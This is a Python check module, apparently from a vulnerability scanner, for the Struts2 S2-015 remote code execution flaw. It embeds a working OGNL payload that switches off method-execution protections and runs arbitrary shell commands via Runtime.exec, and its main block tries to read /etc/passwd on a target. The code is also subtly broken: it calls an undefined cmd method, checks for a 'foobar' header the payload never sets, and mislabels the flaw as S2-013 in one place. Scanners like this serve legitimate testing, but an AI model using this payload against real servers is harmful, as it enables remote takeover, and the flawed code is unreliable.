#!/usr/bin/env python3

from app.lib.request import request
from app.lib.encode import urlencode
from app.lib.common import get_capta, get_useragent

class S2_015_2_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-015漏洞,又名CVE-2013-2134/CVE-2013-2135漏洞',
            'description': 'Struts2 S2-013漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.3.14.2',
            'date': '2013-06-03',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/Helloworld.action'
        self.capta = get_capta() 
        self.headers = {
            'User-Agent': get_useragent(),
            'Connection': "keep-alive",
        }
        self.payload = '''%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cmd_str').getInputStream()),#q}'''
    
    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

       
        try:
            check_url = self.url + '?message=' + urlencode(self.payload.replace('cmd_str', 'echo' + ' ' + self.capta), 'total')
            check_req = await request.get(check_url, headers = self.headers)
            if 'foobar' in check_req.headers.keys() and self.capta in check_req.headers['foobar']:
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_015 = S2_015_2_BaseVerify('http://localhost:8080/s2_015_war_exploded/')
    print(S2_015.cmd('cat /etc/passwd'))
